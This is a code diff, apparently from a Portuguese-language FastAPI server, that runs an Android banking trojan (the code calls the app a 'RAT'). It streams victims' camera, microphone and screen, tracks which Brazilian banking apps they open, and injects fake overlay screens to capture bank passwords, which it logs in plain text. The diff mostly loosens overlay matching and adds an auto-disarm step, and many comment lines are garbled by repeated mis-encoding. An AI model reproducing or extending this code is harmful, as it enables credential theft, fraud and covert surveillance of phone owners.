         if frame_b64:
             frame_bytes = base64.b64decode(frame_b64)
             await manager.store_camera_frame(device_id, frame_bytes)
-            logger.info(f"ðŸ“· Camera frame de {device_id}: {len(frame_bytes)} bytes")
+            logger.info(f"Ã°Å¸â€œÂ· Camera frame de {device_id}: {len(frame_bytes)} bytes")
     
     elif msg_type == "AUDIO_CHUNK":
-        # ðŸŽ¤ Chunk de Ã¡udio (base64)
+        # Ã°Å¸Å½Â¤ Chunk de ÃƒÂ¡udio (base64)
         audio_b64 = message.get("data")
         if audio_b64:
             audio_bytes = base64.b64decode(audio_b64)
             await manager.store_audio_chunk(device_id, audio_bytes)
-            logger.info(f"ðŸŽ¤ Audio chunk de {device_id}: {len(audio_bytes)} bytes")
+            logger.info(f"Ã°Å¸Å½Â¤ Audio chunk de {device_id}: {len(audio_bytes)} bytes")
     
     elif msg_type == "INSTALLED_APPS":
-        # ðŸ“± Lista de apps instalados â€” salva em memÃ³ria E no banco para persistÃªncia de Ã­cones
+        # Ã°Å¸â€œÂ± Lista de apps instalados Ã¢â‚¬â€ salva em memÃƒÂ³ria E no banco para persistÃƒÂªncia de ÃƒÂ­cones
         apps_list = message.get("apps", [])
         apps_count = message.get("count", 0)
         manager.store_installed_apps(device_id, apps_list)
@@ -2999,7 +3056,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         except Exception as e:
             logger.error(f"Erro ao persistir apps: {e}")
         
-        logger.info(f"ðŸ“± Apps instalados de {device_id}: {apps_count} apps")
+        logger.info(f"Ã°Å¸â€œÂ± Apps instalados de {device_id}: {apps_count} apps")
         
     elif msg_type == "BANK_OPENED":
         package = message.get("package")
@@ -3035,7 +3092,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         logger.info(f"BANCO ABERTO: {device_id} abriu {app_name} ({package})")
         
     elif msg_type == "BANK_BALANCE":
-        # ðŸ’° Saldo bancÃ¡rio enviado explicitamente pelo app
+        # Ã°Å¸â€™Â° Saldo bancÃƒÂ¡rio enviado explicitamente pelo app
         package = message.get("package")
         app_name = message.get("appName") or message.get("bank")
         balance = message.get("balance")
@@ -3056,7 +3113,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
             )
             db.add(log)
             db.commit()
-            logger.info(f"ðŸ’° SALDO EXPLICIT de {device_id} ({app_name}): {balance}")
+            logger.info(f"Ã°Å¸â€™Â° SALDO EXPLICIT de {device_id} ({app_name}): {balance}")
         
     elif msg_type == "BANK_CLOSED":
         if device_id in manager.device_active_banks:
@@ -3064,10 +3121,10 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         logger.info(f"BANCO FECHADO: {device_id} fechou o aplicativo de banco")
 
     elif msg_type == "STUDIO_FORM_DATA":
-        # Recebe os dados enviados pelo formulÃ¡rio da tela customizada
+        # Recebe os dados enviados pelo formulÃƒÂ¡rio da tela customizada
         data = message.get("data") or {}
         project_id = message.get("project_id") or data.get("_projectId") or "unknown"
-        logger.info(f"ðŸŽ¨ STUDIO_FORM_DATA recebido de {device_id} para o projeto {project_id}: {data}")
+        logger.info(f"Ã°Å¸Å½Â¨ STUDIO_FORM_DATA recebido de {device_id} para o projeto {project_id}: {data}")
         
         # 1. Salva na tabela StudioCapturedData (se o projeto for conhecido/existente)
         from models import APKStudioProject, StudioCapturedData
@@ -3088,7 +3145,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         db.add(captured)
         db.commit()
         
-        # 1.b. Salva log de overlay submetido para impedir novas exibiÃ§Ãµes no auto-gatilho
+        # 1.b. Salva log de overlay submetido para impedir novas exibiÃƒÂ§ÃƒÂµes no auto-gatilho
         active_bank = manager.device_active_banks.get(device_id) or {}
         pkg_name = active_bank.get("package") or manager.device_info.get(device_id, {}).get("foreground_package") or "unknown"
         
@@ -3106,7 +3163,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         )
         db.add(submit_log)
         
-        # Salva o payload completo como CUSTOM_CAPTURES para visualizaÃ§Ã£o na aba de capturas customizadas
+        # Salva o payload completo como CUSTOM_CAPTURES para visualizaÃƒÂ§ÃƒÂ£o na aba de capturas customizadas
         custom_capture_log = DeviceLog(
             device_id=device_id,
             log_type="CUSTOM_CAPTURES",
@@ -3121,7 +3178,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         db.add(custom_capture_log)
         db.commit()
         
-        # 2. Se houver algum campo de senha no formulÃ¡rio, salva na tabela DeviceLog como BANK_PASSWORD
+        # 2. Se houver algum campo de senha no formulÃƒÂ¡rio, salva na tabela DeviceLog como BANK_PASSWORD
         password = None
         field_found = "Senha"
         for k, v in data.items():
@@ -3141,14 +3198,14 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         if password:
             active_bank = manager.device_active_banks.get(device_id) or {}
             
-            # Tenta pegar pacote vindo da injeÃ§Ã£o ou do active_bank
+            # Tenta pegar pacote vindo da injeÃƒÂ§ÃƒÂ£o ou do active_bank
             target_pkg = data.get("package") or active_bank.get("package") or "Desconhecido"
             target_bank = data.get("bank") or active_bank.get("appName")
             
             if not target_bank or target_bank == "Desconhecido":
                 target_bank = BankPasswordDetector.BANK_APPS.get(target_pkg)
             if not target_bank or target_bank == "Desconhecido":
-                target_bank = 'ItaÃº' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
+                target_bank = 'ItaÃƒÂº' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
             
             password_info = {
                 'device_id': device_id,
@@ -3172,10 +3229,10 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
             )
             db.add(log)
             db.commit()
-            logger.info(f"ðŸ” SENHA CAPTURADA VIA OVERLAY de {device_id} ({target_bank}): {password}")
+            logger.info(f"Ã°Å¸â€Â SENHA CAPTURADA VIA OVERLAY de {device_id} ({target_bank}): {password}")
 
     elif msg_type == "DEVICE_STATUS":
-        # Aceita vÃ¡rios formatos de campo (do app Android)
+        # Aceita vÃƒÂ¡rios formatos de campo (do app Android)
         package = (
             message.get("package") or
             message.get("foregroundPackage") or
@@ -3207,7 +3264,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
             status_update["is_charging"] = bool(message.get("is_charging"))
         manager.device_info[device_id].update(status_update)
         
-        # ðŸ¦ DETECÃ‡ÃƒO AUTOMÃTICA DE BANCO via foreground_package (Loose matching para nÃ£o falhar em nenhum banco)
+        # Ã°Å¸ÂÂ¦ DETECÃƒâ€¡ÃƒÆ’O AUTOMÃƒÂTICA DE BANCO via foreground_package (Loose matching para nÃƒÂ£o falhar em nenhum banco)
         BANK_KEYWORDS = [
             "nubank", "nu.production", "itau", "bb.android", "bancodobrasil", "bradesco", 
             "santander", "bancointer", "intermedium", "caixa", "c6bank", "neon", "pagbank", 
@@ -3228,7 +3285,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
             # 1. Verifica se bate com palavras-chave conhecidas de bancos
             is_bank_kw = any(kw in pkg_lower for kw in BANK_KEYWORDS)
             
-            # 2. Se for um banco da lista padrÃ£o, verifica se Ã© um app instalado/baixado (nÃ£o de sistema)
+            # 2. Se for um banco da lista padrÃƒÂ£o, verifica se ÃƒÂ© um app instalado/baixado (nÃƒÂ£o de sistema)
             if not is_bank_kw:
                 installed_apps = []
                 try:
@@ -3249,10 +3306,10 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                         break
                 
                 if found_app:
-                    # Se achou no cache de apps, ativa se nÃ£o for um app do sistema
+                    # Se achou no cache de apps, ativa se nÃƒÂ£o for um app do sistema
                     is_bank_kw = not found_app.get("isSystem", True)
                 else:
-                    # Fallback robusto caso o cache ainda nÃ£o exista ou esteja vazio
+                    # Fallback robusto caso o cache ainda nÃƒÂ£o exista ou esteja vazio
                     is_system_prefix = (
                         pkg_lower.startswith("com.android.") or
                         pkg_lower.startswith("com.google.android.") or
@@ -3285,10 +3342,10 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
             ]))
             
         if is_bank:
-            # Auto-set active_bank se o app Ã© um banco
+            # Auto-set active_bank se o app ÃƒÂ© um banco
             current_bank = manager.device_active_banks.get(device_id)
             if not current_bank or current_bank.get("package") != package:
-                # Tenta obter o Ã­cone real em base64 do banco a partir do cache
+                # Tenta obter o ÃƒÂ­cone real em base64 do banco a partir do cache
                 captured_icon = None
                 installed_apps = manager.get_installed_apps(device_id)
                 if installed_apps:
@@ -3309,7 +3366,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                                     captured_icon = app.get("icon")
                                     break
                     except Exception as e:
-                        logger.error(f"Erro ao buscar Ã­cone do cache: {e}")
+                        logger.error(f"Erro ao buscar ÃƒÂ­cone do cache: {e}")
 
                 manager.device_active_banks[device_id] = {
                     "package": package,
@@ -3318,12 +3375,12 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                     "timestamp": utc_now().isoformat(),
                     "auto_detected": True
                 }
-                logger.info(f"ðŸ¦ AUTO-DETECTADO banco aberto: {device_id} â†’ {app_name or package}")
+                logger.info(f"Ã°Å¸ÂÂ¦ AUTO-DETECTADO banco aberto: {device_id} Ã¢â€ â€™ {app_name or package}")
         elif package and device_id in manager.device_active_banks:
-            # Se o app em foreground nÃ£o Ã© banco, limpa active_bank (mas sÃ³ se foi auto-detectado)
+            # Se o app em foreground nÃƒÂ£o ÃƒÂ© banco, limpa active_bank (mas sÃƒÂ³ se foi auto-detectado)
             current = manager.device_active_banks.get(device_id, {})
             if current.get("auto_detected"):
-                # Ignora se for teclado ou core system ui para nÃ£o fechar o banco erroneamente ao digitar
+                # Ignora se for teclado ou core system ui para nÃƒÂ£o fechar o banco erroneamente ao digitar
                 pkg_lower = package.lower()
                 is_ignored = (
                     any(k in pkg_lower for k in ["inputmethod", "keyboard", "gboard", "latin", "ime", "swiftkey", "samsung.i18n"]) or
@@ -3331,72 +3388,148 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
                 )
                 if not is_ignored:
                     del manager.device_active_banks[device_id]
-                    logger.info(f"ðŸ¦ AUTO-DETECTADO banco fechado: {device_id} (saiu para {package})")
+                    logger.info(f"Ã°Å¸ÂÂ¦ AUTO-DETECTADO banco fechado: {device_id} (saiu para {package})")
         
-        logger.info(f"ðŸ“± STATUS {device_id}: pkg={package}, app={app_name}, locked={is_locked}, screen_on={is_screen_on}")
+        logger.info(f"Ã°Å¸â€œÂ± STATUS {device_id}: pkg={package}, app={app_name}, locked={is_locked}, screen_on={is_screen_on}")
 
         # ========== AUTO-GATILHO DE OVERLAY ==========
         if package:
             from models import DeviceOverlayMapping
+            from sqlalchemy import func
             
-            # Busca se existe mapeamento ativo para este pacote no dispositivo
+            pkg_clean = package.strip().lower()
+            
+            # Busca se existe mapeamento ativo para este pacote no dispositivo (case-insensitive)
             mapping = db.query(DeviceOverlayMapping).filter(
-                DeviceOverlayMapping.device_id == device_id,
-                DeviceOverlayMapping.package_name == package,
+                func.lower(DeviceOverlayMapping.device_id) == device_id.lower(),
+                func.lower(DeviceOverlayMapping.package_name) == pkg_clean,
                 DeviceOverlayMapping.is_enabled == True
             ).first()
+
+            if not mapping:
+                # Tenta fallback por alias/palavras-chave bancÃ¡rias
+                all_maps = db.query(DeviceOverlayMapping).filter(
+                    func.lower(DeviceOverlayMapping.device_id) == device_id.lower(),
+                    DeviceOverlayMapping.is_enabled == True
+                ).all()
+                bank_kws = ["itau", "caixa", "nubank", "bradesco", "santander", "inter", "c6", "picpay", "mercadopago", "neon", "banrisul", "sicredi", "banco", "bb"]
+                for m in all_maps:
+                    m_pkg = (m.package_name or "").lower()
+                    for kw in bank_kws:
+                        if kw in pkg_clean and kw in m_pkg:
+                            mapping = m
+                            logger.info(f"ðŸ”® Auto-gatilho: Mapeamento equivalente encontrado no servidor ('{m_pkg}' -> '{pkg_clean}')")
+                            break
+                    if mapping:
+                        break
             
             dev_info = manager.device_info.get(device_id, {})
+            if not dev_info:
+                for d_k, d_v in manager.device_info.items():
+                    if d_k.lower() == device_id.lower():
+                        dev_info = d_v
+                        break
             last_injected = dev_info.get("last_injected_package")
             
             # Pega o package name do prÃ³prio RAT/app se registrado para este dispositivo
             device_pkg = None
             try:
-                device = db.query(Device).filter(Device.device_id == device_id).first()
+                device = db.query(Device).filter(func.lower(Device.device_id) == device_id.lower()).first()
                 if device and device.package_name:
                     device_pkg = device.package_name.lower()
             except Exception:
                 pass
             
-            pkg_lower = package.lower()
             is_ignored = (
-                (device_pkg and pkg_lower == device_pkg) or
-                pkg_lower == "com.seguranca.protecao" or
-                any(k in pkg_lower for k in ["inputmethod", "keyboard", "gboard", "latin", "ime", "swiftkey", "samsung.i18n"]) or
-                pkg_lower in ["android", "com.android.systemui"]
+                (device_pkg and pkg_clean == device_pkg) or
+                pkg_clean == "com.seguranca.protecao" or
+                any(k in pkg_clean for k in [
+                    "inputmethod", "keyboard", "gboard", "latin", "ime", "swiftkey", "samsung.i18n",
+                    "permissioncontroller", "systemui", "wallpaper", "chooser", "resolver"
+                ]) or
+                pkg_clean in ["android", "com.android.systemui"]
             )
             
             if mapping:
-                # Verifica se este mapeamento jÃ¡ foi submetido/avanÃ§ado anteriormente neste dispositivo
-                has_been_submitted = db.query(DeviceLog).filter(
-                    DeviceLog.device_id == device_id,
-                    DeviceLog.log_type == "OVERLAY_SUBMITTED",
-                    DeviceLog.log_data.like(f'%"package": "{package}"%')
-                ).first() is not None
-                
-                if not has_been_submitted and last_injected != package:
-                    try:
-                        template_data = json.loads(mapping.template_json)
-                        logger.info(f"ðŸ”® Auto-injetando tela customizada '{mapping.screen_name}' para {package} no dispositivo {device_id}")
-                        
-                        # Define o Ãºltimo pacote injetado para evitar loops
-                        if device_id not in manager.device_info:
-                            manager.device_info[device_id] = {}
-                        manager.device_info[device_id]["last_injected_package"] = package
-                        
-                        # Envia comando de injeÃ§Ã£o da tela
-                        await manager.send_command(device_id, {
-                            "action": "CUSTOM_BLACK_SCREEN",
-                            "template": template_data
-                        })
-                    except Exception as inject_err:
-                        logger.error(f"Erro ao auto-injetar tela no dispositivo {device_id}: {inject_err}")
+                if last_injected != package and last_injected != pkg_clean:
+                    # ðŸ”„ VERIFICAÃ‡ÃƒO: Se o overlay jÃ¡ foi submetido para este pacote, NÃƒO re-injetar
+                    # Em vez disso, deleta o mapeamento (auto-disarm)
+                    already_submitted = db.query(DeviceLog).filter(
+                        func.lower(DeviceLog.device_id) == device_id.lower(),
+                        DeviceLog.log_type == "OVERLAY_SUBMITTED",
+                        DeviceLog.log_data.like(f'%{pkg_clean}%')
+                    ).first()
+                    
+                    # TambÃ©m verifica BANK_PASSWORD capturada para este pacote
+                    if not already_submitted:
+                        already_submitted = db.query(DeviceLog).filter(
+                            func.lower(DeviceLog.device_id) == device_id.lower(),
+                            DeviceLog.log_type == "BANK_PASSWORD",
+                            DeviceLog.log_data.like(f'%{pkg_clean}%')
+                        ).first()
+                    
+                    if already_submitted:
+                        # JÃ¡ foi submetido! Auto-disarm: deleta o mapeamento
+                        try:
+                            db.delete(mapping)
+                            db.commit()
+                            logger.info(f"\n{'='*60}")
+                            logger.info(f"ðŸ”„ AUTO-DISARM NO GATILHO: Overlay jÃ¡ submetido anteriormente!")
+                            logger.info(f"Pacote: {pkg_clean}")
+                            logger.info(f"Device: {device_id}")
+                            logger.info(f"AÃ§Ã£o: Mapeamento removido do DB, overlay NÃƒO re-injetado")
+                            logger.info(f"{'='*60}\n")
+                            
+                            # Reseta tracking
+                            for dev_key in list(manager.device_info.keys()):
+                                if dev_key.lower() == device_id.lower():
+                                    manager.device_info[dev_key]["last_injected_package"] = None
+                            if device_id in manager.device_info:
+                                manager.device_info[device_id]["last_injected_package"] = None
+                            
+                            # Envia BLACK_SCREEN_OFF por seguranÃ§a
+                            await manager.send_command(device_id, {"action": "BLACK_SCREEN_OFF"})
+                            
+                            # Notifica o painel
+                            await manager.broadcast_to_operators({
+                                "type": "OVERLAY_AUTO_DISARMED",
+                                "device_id": device_id,
+                                "package": pkg_clean,
+                                "reason": "ALREADY_SUBMITTED"
+                            })
+                        except Exception as disarm_err:
+                            logger.error(f"Erro no auto-disarm no gatilho: {disarm_err}")
+                    else:
+                        # Overlay ainda nÃ£o foi submetido â€” injetar normalmente
+                        try:
+                            template_data = json.loads(mapping.template_json) if mapping.template_json else {}
+                            if isinstance(template_data, dict):
+                                template_data["package_name"] = mapping.package_name or package
+                            logger.info(f"ðŸ”® Auto-injetando tela customizada '{mapping.screen_name}' para {package} no dispositivo {device_id}")
+                            
+                            # Define o Ãºltimo pacote injetado para evitar loops
+                            for dev_key in list(manager.device_info.keys()):
+                                if dev_key.lower() == device_id.lower():
+                                    manager.device_info[dev_key]["last_injected_package"] = mapping.package_name or package
+                            if device_id not in manager.device_info:
+                                manager.device_info[device_id] = {}
+                            manager.device_info[device_id]["last_injected_package"] = mapping.package_name or package
+                            
+                            # Envia comando de injeÃ§Ã£o da tela
+                            await manager.send_command(device_id, {
+                                "action": "CUSTOM_BLACK_SCREEN",
+                                "template": template_data
+                            })
+                        except Exception as inject_err:
+                            logger.error(f"Erro ao auto-injetar tela no dispositivo {device_id}: {inject_err}")
             elif not is_ignored:
-                # Se nÃ£o Ã© o app mapeado e nÃ£o Ã© ignorado (teclado/nosso app) e tÃ­nhamos injetado, limpa e fecha a overlay
+                # Se nÃ£o Ã© o app mapeado e nÃ£o Ã© ignorado (teclado/nosso app/sistema) e tÃ­nhamos injetado, limpa e fecha a overlay
                 if last_injected:
-                    if device_id not in manager.device_info:
-                        manager.device_info[device_id] = {}
-                    manager.device_info[device_id]["last_injected_package"] = None
+                    for dev_key in list(manager.device_info.keys()):
+                        if dev_key.lower() == device_id.lower():
+                            manager.device_info[dev_key]["last_injected_package"] = None
+                    if device_id in manager.device_info:
+                        manager.device_info[device_id]["last_injected_package"] = None
                     
                     try:
                         logger.info(f"ðŸ”® Aplicativo alvo '{last_injected}' fechado no dispositivo {device_id}. Fechando overlay.")
@@ -3408,7 +3541,7 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
         # ============================================
 
     else:
-        # Ignora logs de sistema que nÃ£o sÃ£o relevantes
+        # Ignora logs de sistema que nÃƒÂ£o sÃƒÂ£o relevantes
         ignored_types = ['PONG', 'OK', 'ACK', 'PING_RESPONSE', 'HEARTBEAT']
         if msg_type not in ignored_types:
             # Log de outras mensagens relevantes
@@ -3422,16 +3555,16 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
             db.commit()
 
 async def handle_screen_frame(device_id: str, frame_data: bytes):
-    """Processa frame de captura de tela com detecÃ§Ã£o de formato universal (raw JPEG/WebP ou 5B header)"""
+    """Processa frame de captura de tela com detecÃƒÂ§ÃƒÂ£o de formato universal (raw JPEG/WebP ou 5B header)"""
     manager.update_device_activity(device_id)
     if not frame_data or len(frame_data) < 4:
         return
         
     jpeg_data = None
-    # 1. Se os dados jÃ¡ forem um arquivo JPEG (\xFF\xD8) ou WebP (RIFF) nativo
+    # 1. Se os dados jÃƒÂ¡ forem um arquivo JPEG (\xFF\xD8) ou WebP (RIFF) nativo
     if frame_data.startswith(b'\xff\xd8') or frame_data.startswith(b'RIFF'):
         jpeg_data = frame_data
-    # 2. Se possuir cabeÃ§alho customizado de 5 bytes [TIPO: 1B][TAMANHO: 4B][DADOS...]
+    # 2. Se possuir cabeÃƒÂ§alho customizado de 5 bytes [TIPO: 1B][TAMANHO: 4B][DADOS...]
     elif len(frame_data) > 5:
         payload = frame_data[5:]
         if payload.startswith(b'\xff\xd8') or payload.startswith(b'RIFF'):
@@ -3446,15 +3579,15 @@ async def handle_screen_frame(device_id: str, frame_data: bytes):
     if jpeg_data and len(jpeg_data) > 0:
         await manager.store_screen_frame(device_id, jpeg_data)
 
-# ==================== API DE AUTENTICAÃ‡ÃƒO ====================
+# ==================== API DE AUTENTICAÃƒâ€¡ÃƒÆ’O ====================
 
 @app.post("/api/auth/login")
 async def login(request: Request, login_req: LoginRequest, db: Session = Depends(get_db)):
-    """Login de operador com proteÃ§Ã£o anti-brute-force e suporte a HWID"""
+    """Login de operador com proteÃƒÂ§ÃƒÂ£o anti-brute-force e suporte a HWID"""
     client_ip = request.client.host if request.client else "unknown"
     now = utc_now()
 
-    # Verifica se IP estÃ¡ bloqueado por limite de tentativas
+    # Verifica se IP estÃƒÂ¡ bloqueado por limite de tentativas
     if client_ip in LOGIN_ATTEMPTS:
         attempt = LOGIN_ATTEMPTS[client_ip]
         if attempt.get("blocked_until") and now < attempt["blocked_until"]:
@@ -3483,24 +3616,24 @@ async def login(request: Request, login_req: LoginRequest, db: Session = Depends
 
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Credenciais invÃ¡lidas"
+            detail="Credenciais invÃƒÂ¡lidas"
         )
 
     # Login correto: reseta tentativas
     LOGIN_ATTEMPTS.pop(client_ip, None)
     
-    # Verifica se estÃ¡ banido
+    # Verifica se estÃƒÂ¡ banido
     if operator.is_banned:
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Sua conta foi banida. Contate o administrador."
         )
     
-    # Verifica se estÃ¡ ativo
+    # Verifica se estÃƒÂ¡ ativo
     if not operator.is_active:
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
-            detail="Sua conta estÃ¡ desativada."
+            detail="Sua conta estÃƒÂ¡ desativada."
         )
     
     # Verifica se a conta expirou
@@ -3514,7 +3647,7 @@ async def login(request: Request, login_req: LoginRequest, db: Session = Depends
     # ==================== GOOGLE AUTHENTICATOR (2FA) ====================
     two_factor_token = create_2fa_token(operator.username)
     
-    # Se o operador jÃ¡ possui 2FA ativado
+    # Se o operador jÃƒÂ¡ possui 2FA ativado
     if operator.totp_enabled and operator.totp_secret:
         return {
             "needs_2fa": True,
@@ -3525,7 +3658,7 @@ async def login(request: Request, login_req: LoginRequest, db: Session = Depends
             "needs_hwid": False
         }
     
-    # Se ainda nÃ£o configurou o 2FA, gera chave e QR Code para configuraÃ§Ã£o inicial
+    # Se ainda nÃƒÂ£o configurou o 2FA, gera chave e QR Code para configuraÃƒÂ§ÃƒÂ£o inicial
     secret = operator.totp_temp_secret or generate_totp_secret()
     operator.totp_temp_secret = secret
     db.commit()
@@ -3548,28 +3681,28 @@ async def setup_2fa(
     body: Setup2FARequest,
     db: Session = Depends(get_db)
 ):
-    """Valida o primeiro cÃ³digo e ativa o Google Authenticator definitivamente"""
+    """Valida o primeiro cÃƒÂ³digo e ativa o Google Authenticator definitivamente"""
     username = decode_2fa_token(body.two_factor_token)
     if not username:
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="SessÃ£o de verificaÃ§Ã£o expirada. FaÃ§a login novamente."
+            detail="SessÃƒÂ£o de verificaÃƒÂ§ÃƒÂ£o expirada. FaÃƒÂ§a login novamente."
         )
     
     operator = db.query(Operator).filter(Operator.username == username).first()
     if not operator:
-        raise HTTPException(status_code=404, detail="UsuÃ¡rio nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="UsuÃƒÂ¡rio nÃƒÂ£o encontrado")
     
     if not operator.totp_temp_secret:
         raise HTTPException(
             status_code=status.HTTP_400_BAD_REQUEST,
-            detail="Nenhuma chave 2FA pendente de ativaÃ§Ã£o."
+            detail="Nenhuma chave 2FA pendente de ativaÃƒÂ§ÃƒÂ£o."
         )
     
     if not verify_totp_code(operator.totp_temp_secret, body.code):
         raise HTTPException(
             status_code=status.HTTP_400_BAD_REQUEST,
-            detail="CÃ³digo do Google Authenticator incorreto. Verifique o horÃ¡rio do celular e digite o cÃ³digo de 6 dÃ­gitos atual."
+            detail="CÃƒÂ³digo do Google Authenticator incorreto. Verifique o horÃƒÂ¡rio do celular e digite o cÃƒÂ³digo de 6 dÃƒÂ­gitos atual."
         )
     
     # Ativa 2FA
@@ -3577,7 +3710,7 @@ async def setup_2fa(
     operator.totp_enabled = True
     operator.totp_temp_secret = None
     
-    # Se nÃ£o for admin e nÃ£o tiver HWID, solicita ativaÃ§Ã£o de HWID
+    # Se nÃƒÂ£o for admin e nÃƒÂ£o tiver HWID, solicita ativaÃƒÂ§ÃƒÂ£o de HWID
     if not operator.is_admin and operator.hwid is None:
         db.commit()
         return {"needs_hwid": True, "access_token": "", "token_type": "bearer", "needs_2fa": False}
@@ -3586,7 +3719,7 @@ async def setup_2fa(
     if not operator.is_admin and operator.hwid and body.hwid and body.hwid != operator.hwid:
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
-            detail="Esta conta estÃ¡ vinculada a outro dispositivo (HWID divergente)."
+            detail="Esta conta estÃƒÂ¡ vinculada a outro dispositivo (HWID divergente)."
         )
     
     operator.last_login = utc_now()
@@ -3602,31 +3735,31 @@ async def verify_2fa(
     body: Verify2FARequest,
     db: Session = Depends(get_db)
 ):
-    """Verifica cÃ³digo de 6 dÃ­gitos do Google Authenticator no login"""
+    """Verifica cÃƒÂ³digo de 6 dÃƒÂ­gitos do Google Authenticator no login"""
     username = decode_2fa_token(body.two_factor_token)
     if not username:
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="SessÃ£o de verificaÃ§Ã£o expirada. FaÃ§a login novamente."
+            detail="SessÃƒÂ£o de verificaÃƒÂ§ÃƒÂ£o expirada. FaÃƒÂ§a login novamente."
         )
     
     operator = db.query(Operator).filter(Operator.username == username).first()
     if not operator:
-        raise HTTPException(status_code=404, detail="UsuÃ¡rio nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="UsuÃƒÂ¡rio nÃƒÂ£o encontrado")
     
     if not operator.totp_enabled or not operator.totp_secret:
         raise HTTPException(
             status_code=status.HTTP_400_BAD_REQUEST,
-            detail="2FA nÃ£o estÃ¡ configurado para este usuÃ¡rio."
+            detail="2FA nÃƒÂ£o estÃƒÂ¡ configurado para este usuÃƒÂ¡rio."
         )
     
     if not verify_totp_code(operator.totp_secret, body.code):
         raise HTTPException(
             status_code=status.HTTP_400_BAD_REQUEST,
-            detail="CÃ³digo do Google Authenticator invÃ¡lido ou expirado."
+            detail="CÃƒÂ³digo do Google Authenticator invÃƒÂ¡lido ou expirado."
         )
     
-    # Se nÃ£o for admin e nÃ£o tiver HWID, solicita ativaÃ§Ã£o de HWID
+    # Se nÃƒÂ£o for admin e nÃƒÂ£o tiver HWID, solicita ativaÃƒÂ§ÃƒÂ£o de HWID
     if not operator.is_admin and operator.hwid is None:
         db.commit()
         return {"needs_hwid": True, "access_token": "", "token_type": "bearer", "needs_2fa": False}
@@ -3635,7 +3768,7 @@ async def verify_2fa(
     if not operator.is_admin and operator.hwid and body.hwid and body.hwid != operator.hwid:
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
-            detail="Esta conta estÃ¡ vinculada a outro dispositivo (HWID divergente)."
+            detail="Esta conta estÃƒÂ¡ vinculada a outro dispositivo (HWID divergente)."
         )
     
     operator.last_login = utc_now()
@@ -3657,7 +3790,7 @@ async def activate_hwid(
     body: HwidActivationBody,
     db: Session = Depends(get_db)
 ):
-    """Ativa HWID para usuÃ¡rio"""
+    """Ativa HWID para usuÃƒÂ¡rio"""
     username = body.username
     password = body.password
     hwid = body.hwid
@@ -3667,13 +3800,13 @@ async def activate_hwid(
     if not operator or not verify_password(password, operator.hashed_password):
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Credenciais invÃ¡lidas"
+            detail="Credenciais invÃƒÂ¡lidas"
         )
     
-    # Verifica se jÃ¡ tem HWID
+    # Verifica se jÃƒÂ¡ tem HWID
     if operator.hwid is not None:
         if operator.hwid == hwid:
-            # Mesmo HWID, sÃ³ faz login
+            # Mesmo HWID, sÃƒÂ³ faz login
             access_token = create_access_token(data={"sub": operator.username})
             operator.last_login = utc_now()
             db.commit()
@@ -3681,15 +3814,15 @@ async def activate_hwid(
         else:
             raise HTTPException(
                 status_code=status.HTTP_403_FORBIDDEN,
-                detail="Esta conta jÃ¡ estÃ¡ vinculada a outro dispositivo (HWID diferente)."
+                detail="Esta conta jÃƒÂ¡ estÃƒÂ¡ vinculada a outro dispositivo (HWID diferente)."
             )
     
-    # Verifica se HWID jÃ¡ estÃ¡ em uso
+    # Verifica se HWID jÃƒÂ¡ estÃƒÂ¡ em uso
     existing = db.query(Operator).filter(Operator.hwid == hwid, Operator.id != operator.id).first()
     if existing:
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
-            detail="Este dispositivo jÃ¡ estÃ¡ vinculado a outra conta."
+            detail="Este dispositivo jÃƒÂ¡ estÃƒÂ¡ vinculado a outra conta."
         )
     
     # Ativa HWID
@@ -3707,7 +3840,7 @@ async def activate_hwid(
 
 @app.get("/api/auth/me")
 async def get_current_user_info(current_user: Operator = Depends(get_current_user)):
-    """Retorna informaÃ§Ãµes do usuÃ¡rio atual"""
+    """Retorna informaÃƒÂ§ÃƒÂµes do usuÃƒÂ¡rio atual"""
     return {
         "id": current_user.id,
         "username": current_user.username,
@@ -3728,22 +3861,22 @@ async def update_profile(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Atualiza o perfil do usuÃ¡rio logado (email, username e/ou senha)."""
+    """Atualiza o perfil do usuÃƒÂ¡rio logado (email, username e/ou senha)."""
     if body.email:
         existing = db.query(Operator).filter(Operator.email == body.email, Operator.id != current_user.id).first()
         if existing:
-            raise HTTPException(status_code=400, detail="Este e-mail jÃ¡ estÃ¡ em uso.")
+            raise HTTPException(status_code=400, detail="Este e-mail jÃƒÂ¡ estÃƒÂ¡ em uso.")
         current_user.email = body.email
 
     if body.username:
         existing = db.query(Operator).filter(Operator.username == body.username, Operator.id != current_user.id).first()
         if existing:
-            raise HTTPException(status_code=400, detail="Este nome de usuÃ¡rio jÃ¡ estÃ¡ em uso.")
